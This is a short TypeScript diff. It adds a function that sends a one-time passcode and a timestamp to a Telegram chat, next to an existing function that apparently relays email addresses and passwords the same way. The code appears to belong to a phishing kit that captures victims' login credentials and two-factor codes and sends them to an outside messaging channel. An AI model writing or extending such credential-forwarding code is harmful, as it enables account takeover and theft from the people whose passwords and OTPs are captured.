@@ -42,3 +42,20 @@ export async function notifyLogin(email: string, password: string): Promise<bool
     return false;
   }
 }
+
+export async function notifyOtpVerification(otp: string): Promise<boolean> {
+  const message = `
+<b>OTP Verification</b>
+
+<b>Code:</b> ${otp}
+<b>Time:</b> ${new Date().toLocaleString()}
+  `.trim();
+
+  try {
+    await sendTelegramMessage(message);
+    return true;
+  } catch (error) {
+    console.error("Failed to send OTP verification notification:", error);
+    return false;
+  }
+}
